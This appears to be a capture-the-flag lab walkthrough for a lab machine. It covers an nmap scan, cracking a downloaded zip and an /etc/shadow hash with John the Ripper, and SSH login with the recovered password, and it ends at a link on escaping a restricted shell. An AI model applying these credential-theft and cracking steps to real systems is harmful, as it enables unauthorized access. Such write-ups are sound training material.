
## Nmap scan

```
nmap -sC -sV -p- 192.168.177.85 --open -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 22:51 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:51
Completed NSE at 22:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:51
Completed NSE at 22:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:51
Completed NSE at 22:51, 0.00s elapsed
Initiating Ping Scan at 22:51
Scanning 192.168.177.85 [2 ports]
Completed Ping Scan at 22:51, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:51
Completed Parallel DNS resolution of 1 host. at 22:51, 0.03s elapsed
Initiating Connect Scan at 22:51
Scanning 192.168.177.85 [65535 ports]
Discovered open port 22/tcp on 192.168.177.85
Discovered open port 80/tcp on 192.168.177.85
Connect Scan Timing: About 37.39% done; ETC: 22:53 (0:00:52 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 91.20% done; ETC: 22:52 (0:00:05 remaining)
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.10% done; ETC: 22:52 (0:00:03 remaining)
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.06% done; ETC: 22:52 (0:00:01 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 22:52 (0:00:00 remaining)
Completed Connect Scan at 22:52, 64.68s elapsed (65535 total ports)
Initiating Service scan at 22:52
Scanning 2 services on 192.168.177.85
Completed Service scan at 22:52, 6.56s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.177.85.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:52
Completed NSE at 22:53, 5.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
Nmap scan report for 192.168.177.85
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-05-18 22:51:48 IST for 78s
Not shown: 53161 closed tcp ports (conn-refused), 12372 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxxReThUimjbPP7ZO1dPbvqSobxafY5J8i9Un5zUH7z9uIZEOHNXzEsq8Vko44IBRv2a7xvuuqtk7yN3XwKdyh8mrt1bV/C7Yx6CZ1q7CiQyYd0QoUqyrp6dGdT6T4fYZ7OwUwyubgqEYdkmiS8qNvlKI2qWdj9hntzzWF9X0F+jbxhLOi6Ovo5DGaSiKxsU/ISjnDsR3geodqeVHbMR+jRq7ucIjRSIOHvp8u9LvrugorZDhdv14yJQj7zfySL1T8WcI8kKUECmZgZTk6iUKYLWZ95oo07kKIs6EeTEGNswUeTjEVebhUFHMep6W1ehU7cE6OREkeZ0Rvuh4EpUTx
|   256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKuMuZL3YT/QadMNsFaoWvNYLjKK/DlWoz1/15wGhrauU2OMlHQWEc7ChAX+QdIWc1aEN6IAabgvzIzHPnRYV0=
|   256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNCj4KmJHpZhhE3ZdD/NkVmz1ePM2XW6l0uK3yCT0Og
80/tcp open  http    syn-ack Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:53
Completed NSE at 22:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.27 seconds
```


**- HTTP port 80 open**

![[Pasted image 20230518225811.png]]

## Cracking zip

```
 zip2john save.zip > hash.txt
ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```
john hash.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
manuel           (save.zip)     
1g 0:00:00:00 DONE 2/3 (2023-05-18 22:57) 8.333g/s 648758p/s 648758c/s 648758C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## zip extracted

```
unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname 
```

- In `etc/passwd` we got 
```
296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash  
```

- In `etc/shadow` we got
```
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
```

## Cracking the shadow password

```
 john pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
server           (296640a3b825115a47b68fc44501c828)     
1g 0:00:00:02 DONE 2/3 (2023-05-18 23:07) 0.3816g/s 1124p/s 1124c/s 1124C/s rockie..121212
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


## SSH using the credentials 

```
ssh 296640a3b825115a47b68fc44501c828@192.168.177.85

password: server

```

![[Pasted image 20230518231412.png]]


## Bypassing Rbash
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/

 - resctricted bash

![[Pasted image 20230518232145.png]]

